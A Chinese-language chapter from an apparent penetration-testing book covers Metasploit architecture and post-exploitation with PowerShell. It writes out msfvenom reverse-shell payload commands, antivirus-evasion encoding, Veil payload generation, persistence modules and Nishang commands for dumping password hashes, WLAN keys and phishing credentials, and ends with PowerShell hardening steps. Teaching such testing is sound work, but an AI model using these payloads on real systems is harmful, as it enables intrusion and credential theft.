# 第七章：Metasploit 和 PowerShell 用于后期利用

在之前的章节中，您学习了**PowerShell**作为攻击平台的强大功能。这只是个开始。现在是时候感受它作为执行复杂攻击的完美工具的真正力量了，而且我们还将发现如何与**Metasploit Framework**并行使用它。

在本章中将涵盖以下主题：

+   Metasploit Framework

+   PowerShell 基础知识

+   PowerShell 有效载荷模块

+   Nishang PowerShell 用于渗透测试和攻击性安全

# 解剖 Metasploit Framework

Metasploit Framework 是最知名的开源利用工具。它最初是由 HD Moore 用 Perl 开发的，但后来转移到了 Ruby。这个框架装载了许多对黑客和渗透测试人员有用的功能。要安装 Metasploit Framework，请访问[`www.rapid7.com/products/metasploit/download/`](https://www.rapid7.com/products/metasploit/download/)并执行以下步骤：

1.  选择您的计划，注册并选择您的操作系统。在这个演示中，我使用的是 Windows 64 位试用版：

![](img/00198.jpeg)

1.  您将收到一封带有试用激活密钥的电子邮件：

![](img/00199.jpeg)

1.  现在在您的机器上安装它：

![](img/00200.jpeg)

1.  看啊！您可以开始您的利用之旅：

![](img/00201.jpeg)

# Metasploit 架构

Metasploit 架构由许多重要组件组成。要充分利用 Metasploit 的功能，需要许多组件：

+   **工具**：这是一组有用的实用程序

+   **插件**：这些是运行时可加载的扩展

+   **库**：这些是有用的 Ruby 库

+   **接口**：这些使用户能够以不同的方式访问 Metasploit（例如 CLI 和 web）

+   **模块**：这些是执行特定任务的组件

这张图解释了 Metasploit 框架的架构：

![](img/00202.jpeg)

# 模块

Metasploit Framework 使用许多模块。如果您在 Kali Linux 发行版中使用 Metasploit Framework，您可以列出这些模块。转到`/usr/share/metasploit-framework/modules`并使用`ls`命令来探索它们，如下面的屏幕截图所示：

![](img/00203.jpeg)

# 利用

正如我们在旅程中讨论的，利用是黑客攻击中的一个重要步骤。事实上，Metasploit 通过加载的利用给黑客和安全专业人员提供了巨大的利用能力。这个阶段不仅会通过找到利用漏洞的真实证据来最小化漏洞工具和扫描器的误报率，而且还会导致后期利用。在野外有三种类型的利用：

+   **服务器端漏洞**

+   **客户端漏洞**

+   **本地权限提升**

# 有效载荷

有效载荷是利用模块。有两种有效载荷类别：`分段`。内联有效载荷（或单个有效载荷）是全包容和独立的。分段有效载荷包含多个有效载荷的部分，称为**分段器**。换句话说，完整的有效载荷由分段器组成：

![](img/00204.jpeg)

Metasploit 装载了各种类型的有效载荷：

+   **绑定 shell**：这些只是等待黑客连接或发送指令。如果受害者直接连接到机器，它们是一个不错的选择：

+   **反向 shell**

+   **监听器**

+   **阶段**

+   **Meterpreter**：它们是专门的命令环境。它们完全在被利用进程使用的内存中工作。您可以使用许多 Meterpreter 命令进行后期利用，例如：

+   `sysinfo`

+   `getsystem`

+   `getuid`

+   `reg`

+   `background`

+   `ps`

+   `kill`

作为渗透测试人员，Meterpreter 将为您提供许多其他方便的命令，例如：

+   +   `ifconfig`

+   `route`

+   `portfwd`

+   `webcam_list`

+   `webcam_snap`

+   `record_mic`

+   `screenshot`

+   `idletime`

+   `uictl`

+   **偏执 Meterpreter 有效载荷**：这些使用签名的 SSL/TLS 证书。

+   **无分段 Meterpreter 有效载荷**：这些包含启动会话所需的所有内容。

# 辅助

辅助执行各种任务，包括扫描、DNS 查询等：

+   `auxillary/scanner/portscan/tcp`：连接扫描

+   `auxiliary/scanner/portscan/syn`：半开放式 SYN 隐秘扫描

+   `auxiliary/scanner/discovery/udp_sweep`：UDP 扫描

# 编码器

编码器用于规避检测，因为直接使用 Metasploit 生成有效载荷并不明智，因为大多数反恶意软件程序都会检测到它。因此，可以使用编码器来对有效载荷进行编码，因为有许多可用的编码器：

![](img/00205.jpeg)

# NOPs

**NOP** 是汇编代码中 **No Operation** 的缩写。它确保任何未使用的空间对处理器执行仍然有效，没有任何影响。在 Metasploit 中，它们用于保持有效载荷大小的一致性。

# Posts

Posts 用于利用后（成功利用系统后）。您可以在`/usr/share/metasploit-framework/modules/post`中找到利用后模块，或者只需在 Metasploit 控制台中输入`show post`：

```
msf> show post
```

![](img/00206.jpeg)

要了解有关某个 post 的更多信息，请使用`info`命令。例如，如果您想了解有关`golden_ticket` post 模块的更多信息，只需输入`info post/windows/escalate/golden_ticket`：

![](img/00207.jpeg)

这个神奇的工具还可以使用 `loadpath` 命令加载自己的模块：

![](img/00208.jpeg)

# 启动 Metasploit

要启动 Metasploit，您需要打开 shell 并输入`msfconsole`。以下截图代表 Metasploit 的控制台模式（`msfconsole`）。正如讨论的那样，Metasploit 还有其他接口，如`msfcli`（类似于`msfconsole`，但不是交互式的），`msfgui`（图形版本）和`armitage`（强大的 GUI 界面）。

以下截图是`msfcli`的：

![](img/00209.jpeg)

Metasploit 命令包括：

+   `help`：提供有关如何使用功能的信息

+   `show payloads`：列出可用的有效载荷

+   `show exploits`：列出可用的利用

+   `show options`：列出所需的选项

+   `msfupdate`：更新 Metasploit

+   `use`：使用模块

+   `search`：搜索功能

+   `exploit`：启动利用

![](img/00210.jpeg)

在深入了解 Metasploit 强大的命令之前，让我们先检查 Metasploit 框架的组件：

+   `msfpayload`：在利用后要在目标机器上运行的脚本。

+   `msfencode`：用于避免检测有效载荷的神奇实用程序。

+   `msfvenom`：这类似于前两个实用程序的组合。这是 Metasploit 中的一个新功能：

![](img/00211.jpeg)

您可以通过输入以下内容来检查可用的有效载荷格式：

```
# msfvenom --help-formats
```

![](img/00212.jpeg)

例如，如果要生成 Windows 有效载荷，请输入以下内容：

```
# msfvenom -p windows/shell/reverse_tcp LHOST=[YourIPaddress]
```

```
LPORT=8080  - f exe > [A_Specific_PATH]/  payload.exe
```

![](img/00213.jpeg)

# 使用 Veil-Framework 绕过防病毒软件

作为渗透测试人员，永远记住您正在模拟真实世界的攻击，在现实世界中，黑客正在尝试使用许多技术绕过防病毒保护。**Veil-Framework** 是一个避免有效载荷检测的绝妙工具。要安装 Veil 3.0，您需要从其官方 GitHub 来源[`github.com/Veil-Framework/Veil`](https://github.com/Veil-Framework/Veil)下载它：

```
# git clone https://github.com/Veil-Framework/Veil
```

![](img/00214.jpeg)

现在您只需要从辅助主菜单中选择一个任务：

![](img/00215.gif)

要生成有效载荷，请选择`list`，然后输入`use 1`：

![](img/00216.gif)

要列出所有可用的有效载荷，请像往常一样使用`list`：

![](img/00217.gif)

使用`use`命令选择您的有效载荷：

![](img/00218.gif)

输入`generate`来创建有效载荷：

![](img/00219.gif)

完成选项后，您将生成一个无法检测的有效载荷，就是这么简单：

![](img/00220.gif)

您还可以使用 Metasploit 进行 Nmap 扫描，将结果导出并稍后从数据库导入（Metasploit 使用 PostgreSQL 数据库）：

```
Msf> nmap [target] -oX [output]
```

![](img/00221.jpeg)

Metasploit 是一个令人难以置信的工具。因此，它为渗透测试人员提供了大量的功能；其中之一是能够将结果导出到诸如 PostgreSQL 之类的数据库。如果您已经安装了 PostgreSQL，可以使用 Metasploit 的`db_connect`实用程序验证 Metasploit 与数据库之间的连接：

```
msf> db_connect postgres:myPassword@127.0.0.1/pentester msf> db_status
```

Metasploit 通过添加`searchsploit`实用程序来简化搜索大量利用。您可以添加最多三个搜索词。

例如，`# searchsploit local`：

![](img/00222.jpeg)

# 编写自己的 Metasploit 模块

如前所述，白帽黑客应该知道如何编写自己的工具和脚本。因此，让我们看看如何创建一个简单的 Metasploit 模块。在这个演示中，我们将使用 Ruby 作为编程语言，并构建一个 TCP 扫描器。

首先，创建一个 Ruby 文件：

```
require 'msf/core'
class Metasploit3 <Msf::Auxiliary
include Msf::Exploit::Remote::Tcp
include Msf::Auxiliary::Scanner
def intialize
super(
'Name' => 'TCP scanner',
'Version' => '$Revisiov: 1 $',
'Description' => 'This is a Demo for Packt Readers',
'License' => MSF_LICENSSE
)
register_options([
opt::RPORT(3000)
], self.class)
end
def run_host(ip)
connect()
greeting = "Hello Cybrary"
sock.puts(greeting)
data = sock.recv(1024)
print_status("Received: #{data} from #{ip}")
end
end
```

要测试响应，请创建一个名为`server.txt`的文本文件，并设置 netcat 监听器。现在，将其保存在`usr/share/metasploit-framework/modules/auxiliary/scanner`：

```
nc -lnvp 3000 < server.txt
```

![](img/00223.jpeg)

打开 Metasploit，键入`use scanner/TCPScanner`：

![](img/00224.jpeg)

您可以通过包括`include Msf::Auxiliary::Report`来报告结果。

例如，您可以使用这种方法：

```
results ( :host => rhost, :data => data )
```

# Metasploit 持久性脚本

持久性是每次成功的黑客攻击中的主要需求。Metasploit Framework 带有两个主要的持久性脚本：

+   **S4U 持久性（计划持久性）**：要使用它，请键入`use exploit/windows/local/s4u_persistence`

![](img/00225.jpeg)

+   **卷影副本服务持久性（VSS 持久性）**：要使用它，键入`use exploit/windows/local/vss_persistence`

![](img/00226.jpeg)

这里有一些持久性的额外选项：

+   **Metasploit 服务**（或**Metsvc**）

+   **VNC 注入**

您可以使用 Windows 二进制文件。要定位这些二进制文件，转到`/usr/share/windows-binaries path`：

![](img/00227.jpeg)

# 武器化的 PowerShell 与 Metasploit

在之前的章节中，我们见证了 PowerShell 及其潜力的力量。这只是开始；现在，我们准备将其力量发挥到下一个级别。结合 Metasploit 和 PowerShell 的灵活性是执行更多定制攻击和安全测试的绝佳机会。

# 交互式 PowerShell

PowerShell 攻击已经集成到 Metasploit 中。您可以使用`search`命令进行检查：

```
msf> search powershell
```

![](img/00228.jpeg)

在第四章，*活动目录利用*中，您学习了如何使用 PowerShell 执行一些任务。现在是时候学习如何使用 PowerShell 与 Metasploit。例如，您可以使用`msfvenom`实用程序将 PowerShell 脚本转换为可执行文件进行演示：

```
>msfvenom    -p    windows/powershell_reverse_tcp LHOST=192.168.1.39    LPORT=4444    -f    exe    >    evilPS.exe >msfvenom  -p     windows/exec     CMD=“powershell     -ep     bypass     -W     Hidden     -enc   [Powershell script Here]”    -f    exe    -e    x86/shikata_ga_nai    -o   /root/home/ghost/Desktop/power.exe
```

# PowerSploit

PowerSploit 是信息安全专业人员，特别是渗透测试人员使用的一组令人惊叹的 PowerShell 脚本。要下载 PowerSploit，您需要从其官方 GitHub 存储库[`github.com/PowerShellMafia/PowerSploit`](https://github.com/PowerShellMafia/PowerSploit)获取：

```
# git clone https://github.com/PowerShellMafia/PowerSploit 
```

克隆项目后，使用`ls`命令列出文件：

从以下截图中，您可以注意到 PowerSploit 包含许多惊人的脚本，用于执行许多任务，例如：

+   `绕过杀毒软件`

+   `外泄`

+   ``持久性``

+   `PowerSploit`

+   `PowerUp`

+   `PowerView`

![](img/00229.jpeg)

# Nishang - 用于渗透测试的 PowerShell

Nishang 是一个用于执行许多渗透测试阶段任务的工具集。您可以从[`github.com/samratashok/nishang`](https://github.com/samratashok/nishang)获取它：

```
# git clone https://github.com/samratashok/nishang
```

从下载的项目列表中可以看出，Nishang 加载了许多不同的脚本和实用程序，用于在渗透测试任务期间执行许多所需的任务，例如：

+   **权限提升**

+   **扫描**

+   **枢纽**

您可以使用`ls`命令列出 Nishang 项目的所有可用脚本：

![](img/00230.gif)

让我们在 Windows 机器上探索一些 Nishang 脚本的强大功能：

![](img/00231.jpeg)

您可以使用`Import-Module` PowerShell 命令导入所有模块：

![](img/00232.jpeg)

哎呀，出了点问题！别担心，为了使用`Import-Module`，您需要以管理员身份打开 PowerShell，并输入`Set-ExecutionPolicy -ExecutionPolicy RemoteSigned`：

![](img/00233.jpeg)

然后你可以导入模块：

![](img/00234.jpeg)

现在，如果您想要使用`Get-Information`模块，只需输入`Get-Information`：

![](img/00235.jpeg)

如果您想要揭示 WLAN 密钥，请输入`Get-WLAN-Keys`：

![](img/00236.jpeg)

您甚至可以在后渗透任务中从目标机器中转储密码哈希。借助`Get-PassHashes`模块，您可以转储密码哈希。这是我本地机器的输出：

![](img/00237.jpeg)

但是，如果你想在获得 shell 后弹出命令，请使用：

```
Powershell.exe –exec bypass –Command “& {Import-Module '[PATH_HERE]/Get-PassHashes.ps1' , Get-PassHashes}”
```

您甚至可以使用`Invoke-CredentialPhish`进行钓鱼攻击，就像之前的演示一样。您可以在受害者的机器上运行这次攻击：

![](img/00238.jpeg)

# 防范 PowerShell 攻击

在前几节中，我们介绍了使用 Metasploit 和 PowerShell 攻击机器的各种技术。现在是时候学习如何防御和减轻 PowerShell 攻击了。为了防范 PowerShell 攻击，您需要：

1.  实施最新的 PowerShell 版本（在撰写本书时为版本 5）。要检查，请输入`Get-Host`：

![](img/00239.jpeg)

1.  监视 PowerShell 日志。

1.  确保最低特权策略和组策略设置。您可以使用本地组策略编辑器进行编辑。如果您使用的是 Windows 10 企业版，您还可以使用`AppLocker`：

![](img/00240.jpeg)

1.  使用受限语言模式：

```
PS C:\Windows\system32> [environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
```

1.  要检查受限语言模式，请输入：

```
 $ExecutionContext.SessionState.LanguageMode
```

1.  这样，恶意脚本就无法运行：

![](img/00241.jpeg)

# 总结

在本章中，您学会了如何同时使用 Metasploit 和 PowerShell 来渗透基础架构，并将攻击提升到下一个级别，从侦察开始，到保持访问和持久性。我们研究了架构和操作的两种武器。下一章将是一个新的体验，您将学习如何利用企业 VLANS，并从理论转向实际经验。
